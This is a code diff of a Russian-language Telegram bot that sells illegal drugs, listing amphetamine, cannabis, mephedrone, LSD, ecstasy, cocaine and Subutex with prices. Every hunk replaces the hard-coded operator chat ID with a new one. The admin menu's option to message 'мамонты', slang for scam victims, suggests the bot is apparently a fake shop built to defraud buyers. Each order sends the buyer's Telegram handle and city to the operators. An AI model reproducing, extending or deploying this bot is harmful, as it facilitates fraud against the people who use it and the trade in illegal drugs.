@@ -44,7 +44,7 @@ def firstmenu(message):
     keyboard.row(
         telebot.types.InlineKeyboardButton('Отзывы', url='https://t.me/draghoney')
     )
-    if str(message.chat.id) == '697601461':
+    if str(message.chat.id) == '879694071':
         keyboard.row(
             telebot.types.InlineKeyboardButton('Отправить сообщение мамонтам', callback_data='sentmamont')
         )
@@ -310,7 +310,7 @@ def online(message):
     rajon = r.get((str("Rajon") + str(message.chat.id))).decode('utf-8')
     staff = r.get((str("Staff") + str(message.chat.id))).decode('utf-8')
     mamont = r.get(str(message.chat.id)).decode('utf-8')
-    bot.send_message(697601461,
+    bot.send_message(879694071,
                      "Заявка создана\n"
                      'Город: ' + str(city) +
                      "\nРайон: " + str(rajon) +
@@ -350,7 +350,7 @@ def pszelew(message):
     rajon = r.get((str("Rajon") + str(message.chat.id))).decode('utf-8')
     staff = r.get((str("Staff") + str(message.chat.id))).decode('utf-8')
     mamont = r.get(str(message.chat.id)).decode('utf-8')
-    bot.send_message(697601461,
+    bot.send_message(879694071,
                      "Заявка создана\n"
                      'Город: ' + str(city) +
                      "\nГеолокация: " + str(rajon) +
@@ -505,7 +505,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на амф")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на амф")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на амф")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Амф 1г")
@@ -515,7 +515,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на амф")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на амф")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на амф")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Амф 3г")
@@ -525,7 +525,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Шишки 1г")
@@ -535,7 +535,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Шишки 2г")
@@ -545,7 +545,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
         r.set((str("Staff") + str(query.message.chat.id)), "Шишки 5г")
         r.set((str("Price") + str(query.message.chat.id)), "1100")
@@ -554,7 +554,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Шишки AK47 1г")
@@ -564,7 +564,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Шишки AK47 2г")
@@ -574,7 +574,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на шмаль")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Шишки AK47 5г")
@@ -584,7 +584,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на мефедрон")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на мефедрон")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на мефедрон")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Мефедрон 1г")
@@ -594,7 +594,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на мефедрон")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на мефедрон")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на мефедрон")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Мефедрон 2г")
@@ -604,7 +604,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на мефедрон")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на мефедрон")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на мефедрон")
         r.set((str("Staff") + str(query.message.chat.id)), "Мефедрон 3г")
         r.set((str("Price") + str(query.message.chat.id)), "1500")
@@ -613,7 +613,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на грибы")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на грибы")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на грибы")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Грибы 3г")
@@ -623,7 +623,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на грибы")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на грибы")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на грибы")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Грибы 6г")
@@ -633,7 +633,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на марки")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на марки")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на марки")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Марка(LSD)")
@@ -643,7 +643,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на марки")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на марки")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на марки")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Марка(LSD) 2шт")
@@ -653,7 +653,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на таблетки")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на таблетки")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на таблетки")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Экстази 'Superman' 1шт")
@@ -663,7 +663,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на таблетки")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на таблетки")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на таблетки")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Экстази 'Superman' 5шт")
@@ -673,7 +673,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на таблетки")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на таблетки")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на таблетки")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Экстази 'Superman' 2шт")
@@ -683,7 +683,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на кокс")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на кокс")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на кокс")
 
         r.set((str("Staff") + str(query.message.chat.id)), "Кокаин 0.5г")
@@ -693,7 +693,7 @@ def iq_callback(query):
         bot.answer_callback_query(query.id)
         user = r.get(query.message.chat.id).decode('utf-8')
         city = r.get('city' + str(query.message.chat.id)).decode('utf-8')
-        bot.send_message(697601461, "@" + str(user) + " из города " + str(city) + " втыкает на субитекс")
+        bot.send_message(879694071, "@" + str(user) + " из города " + str(city) + " втыкает на субитекс")
         bot.send_message(487446810, "@" + str(user) + " из города " + str(city) + " втыкает на субитекс")
         r.set((str("Staff") + str(query.message.chat.id)), "Субитекс 1шт")
         r.set((str("Price") + str(query.message.chat.id)), "320")
